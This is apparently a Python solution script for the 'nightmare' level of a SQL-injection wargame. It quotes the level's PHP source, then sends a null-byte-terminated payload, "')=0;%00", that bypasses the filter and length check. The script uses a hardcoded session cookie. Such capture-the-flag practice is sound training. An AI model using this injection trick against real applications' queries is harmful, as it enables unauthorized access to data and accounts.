import requests

"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
"""

url = "https://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=')=0;%00" # ''=0 returns 0 and pw=0 compares a string with number which returns True

cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")